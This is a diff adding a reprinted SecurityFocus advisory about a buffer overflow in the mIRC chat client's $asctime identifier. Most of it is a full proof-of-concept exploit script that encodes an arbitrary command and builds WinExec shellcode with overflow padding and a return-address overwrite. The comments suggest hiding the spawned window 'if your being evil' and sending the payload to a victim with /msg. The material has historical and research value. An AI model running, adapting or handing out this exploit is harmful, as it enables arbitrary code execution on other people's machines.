@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/5576/info
+
+mIRC is a chat client for the IRC protocol, designed for Microsoft Windows based operating systems. mIRC includes support for a scripting language.
+
+A buffer overflow vulnerability has been reported in the $asctime identifier, a function in the mIRC scripting language. The error lies in the handling over oversized format specifier strings.
+
+Exploitation will rely on a script passing untrusted input to this function. Reportedly, no such script is included in the default installation of mIRC. 
+
+; Proof of concept Code for asctime exploit
+; Author: James Martin
+; Website: http://www.uuuppz.com
+; Email: me@uuuppz.com
+;
+; Usage:
+; /asctime_poc notepad c:\autoexec.nat
+; /asctime_poc command.com /c echo Your have been rooted > c:\rooted.txt
+; etc :)
+;
+;
+/asctime_poc {
+; Set Show State
+;
+; Valid Values:
+; 1 - Show Normal (This will break a ctcp request)
+; 2 - Minimise (If your being evil... ;))
+; 3 - Maximise
+set %showstate 2
+
+; Build Coded Command String
+set %command $1-
+set %count 1
+unset %codedcommand
+:loop
+set %codedcommand %codedcommand $+ $chr($calc(128+$asc($mid(%command, %count, 1))))
+set %count $calc( %count + 1)
+if %count <= $len(%command) goto loop 
+
+; Shell Code to Execute
+;
+; Detects mirc version, decodes the command string then calls winexec
+set %shellcode $chr(184) $+ PPP $+ $chr(255) $+ $chr(193) $+ $chr(224) $+ $chr(8) $+ $chr(193) $+ $chr(232) $+ $chr(8) $+ f $+ $chr(139) $+ $chr(24) $+ f $+ $chr(129) $+ $chr(251) $+ $chr(220) $+ qu $+ $chr(7) $+ $chr(184) $+ $chr(250) $+ $chr(253) $+ $chr(5) $+ $chr(255) $+ $chr(235) $+ $chr(19) $+ f $+ $chr(129) $+ $chr(251) $+ $str($chr(255),2) $+ u $+ $chr(7) $+ $chr(184) $+ $chr(190) $+ $chr(187) $+ $chr(4) $+ $chr(255) $+ $chr(235) $+ $chr(5) $+ $chr(184) $+ $chr(210) $+ $chr(129) $+ $chr(4) $+ $chr(255) $+ 5PPP $+ $chr(255) $+ $chr(235) $+ $chr(30) $+ Yj $+ $chr( %showstate ) $+ QIA $+ $chr(128) $+ 9 $+ $chr(255) $+ u $+ $chr(2) $+ $chr(235) $+ $chr(5) $+ $chr(128) $+ 1 $+ $chr(128) $+ $chr(235) $+ $chr(243) $+ $chr(128) $+ 1 $+ $chr(255) $+ $chr(255) $+ $chr(208) $+ ]]] $+ $chr(139) $+ $chr(229) $+ ] $+ $chr(195) $+ $chr(232) $+ $chr(221) $+ $str($chr(255),3) 
+
+; Build Exploit String
+set %exploitstring %shellcode $+ %codedcommand $+ $chr(255) $+ $str(a, $calc(300-2- $len(%command))) $+ q $+ $chr(17) $+ $chr(64) 
+
+; Run exploit string
+;
+; In the real world it would be more like
+; /msg muppet weirdcommand %exploitstring
+echo 1 $asctime(%exploitstring)
+}
